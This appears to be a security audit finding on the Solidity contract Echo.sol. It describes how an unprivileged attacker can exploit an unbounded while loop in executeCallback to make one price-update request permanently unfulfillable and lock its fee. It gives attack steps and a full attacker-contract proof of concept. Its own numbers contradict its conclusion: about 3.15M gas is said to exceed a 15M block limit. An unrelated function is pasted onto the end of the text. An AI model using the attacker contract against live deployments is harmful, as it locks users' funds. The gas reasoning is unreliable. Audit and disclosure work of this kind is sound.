### Title
Unbounded `while` Loop in `executeCallback` Enables Permanent DoS of Request Fulfillment - (File: `target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

---

### Summary

The `executeCallback` function in `Echo.sol` contains an unbounded `while` loop that advances `_state.firstUnfulfilledSeq` by scanning forward through all sequence numbers, performing a storage read per iteration. An unprivileged attacker can inflate the gap between `firstUnfulfilledSeq` and `currentSequenceNumber` by creating many requests and fulfilling all but the lowest-numbered one. When the lowest-numbered request is eventually fulfilled, the loop iterates through the entire cleared range, consuming gas proportional to the number of prior requests. At sufficient scale this causes the `executeCallback` transaction to revert out-of-gas, permanently locking the unfulfilled request and its associated fee.

---

### Finding Description

In `Echo.sol`, after a request is cleared, the contract attempts to advance `_state.firstUnfulfilledSeq` past all already-fulfilled sequence numbers:

```solidity
// TODO: I'm pretty sure this is going to use a lot of gas because it's doing a storage lookup for each sequence number.
// a better solution would be a doubly-linked list of active requests.
while (
    _state.firstUnfulfilledSeq < _state.currentSequenceNumber &&
    !isActive(findRequest(_state.firstUnfulfilledSeq))
) {
    _state.firstUnfulfilledSeq++;
}
``` [1](#0-0) 

Each iteration calls `findRequest`, which performs at minimum one cold `SLOAD` (2,100 gas) against `_state.requests[shortKey]`, and potentially a second cold `SLOAD` against `_state.requestsOverflow[key]` if the slot is occupied by a different sequence number:

```solidity
function findRequest(uint64 sequenceNumber) internal view returns (Request storage req) {
    (bytes32 key, uint8 shortKey) = requestKey(sequenceNumber);
    req = _state.requests[shortKey];
    if (req.sequenceNumber == sequenceNumber) {
        return req;
    } else {
        req = _state.requestsOverflow[key];
    }
}
``` [2](#0-1) 

There is no cap on the number of iterations. The loop runs until it finds an active request or exhausts all sequence numbers up to `currentSequenceNumber`. The developers themselves flag this in a TODO comment at line 166.

The fixed-size request array holds only 32 slots (`NUM_REQUESTS = 32`); all additional requests spill into the overflow mapping, each requiring a separate cold `SLOAD`: [3](#0-2) 

---

### Impact Explanation

When the while loop iterates over N cleared sequence numbers, the gas cost is approximately `N × 2,100` gas (cold SLOAD per `findRequest` call). At N ≈ 1,500 the loop alone consumes ~3,150,000 gas. On chains with a 30M block gas limit this is feasible but on L2s or chains with lower limits it is reachable at far fewer requests.

Because the while loop executes **before** the consumer callback (line 176) and **after** fee crediting (line 161), an out-of-gas revert in the loop causes the entire transaction to revert. This means:

- The provider's fee credit is rolled back.
- `clearRequest` is rolled back — the request remains active.
- The consumer callback is never executed.
- The request is permanently unfulfillable: every subsequent `executeCallback` attempt for that sequence number will hit the same loop and revert again.
- The requester's fee paid at request time is locked in the contract with no recovery path. [4](#0-3) 

---

### Likelihood Explanation

The attack is reachable by any unprivileged address:

1. `requestPriceUpdatesWithCallback` is open to any caller who pays the fee.
2. `executeCallback` has no persistent access control — after `exclusivityPeriodSeconds` elapses, any address may call it. [5](#0-4) 

The attacker's concrete steps:

1. Call `requestPriceUpdatesWithCallback` N+1 times. Request #1 uses a `publishTime` the attacker controls (e.g., the current block timestamp). Requests #2–#(N+1) use easily-satisfiable parameters.
2. Wait for the exclusivity period to expire.
3. Call `executeCallback` for requests #2 through #(N+1) (providing valid Pyth price update data obtainable from Hermes). Each call clears those requests; the while loop stops at seq #1 (still active), so `firstUnfulfilledSeq` remains at 1.
4. Now `firstUnfulfilledSeq = 1` and N sequence numbers above it are cleared. Any attempt to fulfill request #1 triggers the loop over all N cleared entries and reverts out-of-gas.

The attacker's cost is N+1 request fees plus gas for N `executeCallback` calls. The benefit is permanent DoS of request #1 and permanent lock of its fee. This is economically viable at scale because request fees are small relative to the damage caused.

---

### Recommendation

Replace the unbounded `while` loop with a bounded alternative. Options include:

1. **Doubly-linked list of active requests** (already suggested in the TODO comment): maintain `prev`/`next` pointers so `firstUnfulfilledSeq` can be updated in O(1) by following the next pointer.
2. **Cap the loop iterations**: advance `firstUnfulfilledSeq` by at most a fixed number of steps per `executeCallback` call (e.g., 32, matching `NUM_REQUESTS`). Accept that `firstUnfulfilledSeq` may lag behind and catch up lazily.
3. **Remove the `firstUnfulfilledSeq` scan entirely**: use `firstUnfulfilledSeq` only as a hint for `getFirstActiveRequests` (a view function) and do not update it inside `executeCallback`. [6](#0-5)

### Proof of Concept

```solidity
// Attacker contract
contract EchoDoSAttacker {
    IEcho echo;
    address provider;
    uint32 exclusivityPeriod;

    constructor(address _echo, address _provider, uint32 _exclusivity) {
        echo = IEcho(_echo);
        provider = _provider;
        exclusivityPeriod = _exclusivity;
    }

    // Step 1: Create N+1 requests. Request #1 is the target; #2..N+1 are sacrificial.
    function createRequests(
        bytes32[] calldata priceIds,
        uint32 callbackGasLimit,
        uint256 N
    ) external payable {
        uint96 fee = echo.getFee(provider, callbackGasLimit, priceIds);
        // Request #1 — target request
        echo.requestPriceUpdatesWithCallback{value: fee}(
            provider, uint64(block.timestamp), priceIds, callbackGasLimit
        );
        // Requests #2..N+1 — sacrificial
        for (uint i = 0; i < N; i++) {
            echo.requestPriceUpdatesWithCallback{value: fee}(
                provider, uint64(block.timestamp), priceIds, callbackGasLimit
            );
        }
    }

    // Step 2: After exclusivity period, fulfill requests #2..N+1.
    // firstUnfulfilledSeq stays at 1 (request #1 still active).
    function fulfillSacrificial(
        uint64[] calldata seqNums,
        bytes[] calldata updateData,
        bytes32[] calldata priceIds
    ) external payable {
        for (uint i = 0; i < seqNums.length; i++) {
            echo.executeCallback{value: 0}(
                provider, seqNums[i], updateData, priceIds
            );
        }
    }

    // Step 3: Now any attempt to fulfill request #1 will iterate through
    // N cleared sequence numbers in the while loop and revert out-of-gas.
    // The provider's executeCallback for seq #1 will always revert.
}
```

With N ≈ 1,500 on a chain with a ~15M gas block limit, the while loop alone consumes `1500 × 2100 = 3,150,000` gas. Combined with the rest of `executeCallback` overhead (Pyth parsing, storage writes, callback gas), the transaction reliably exceeds the block gas limit, permanently preventing fulfillment of request #1 and locking its fee.     function getFirstActiveRequests(
        uint256 count
    )
        external
        view
        override
        returns (Request[] memory requests, uint256 actualCount)
    {
        requests = new Request[](count);
        actualCount = 0;

        // Start from the first unfulfilled sequence and work forwards
        uint64 currentSeq = _state.firstUnfulfilledSeq;

        // Continue until we find enough active requests or reach current sequence
        while (
            actualCount < count && currentSeq < _state.currentSequenceNumber
        ) {
            Request memory req = findRequest(currentSeq);
            if (isActive(req)) {
                requests[actualCount] = req;
                actualCount++;
            }
            currentSeq++;
        }

        // If we found fewer requests than asked for, resize the array
        if (actualCount < count) {
            assembly {
                mstore(requests, actualCount)
            }
        }
    }
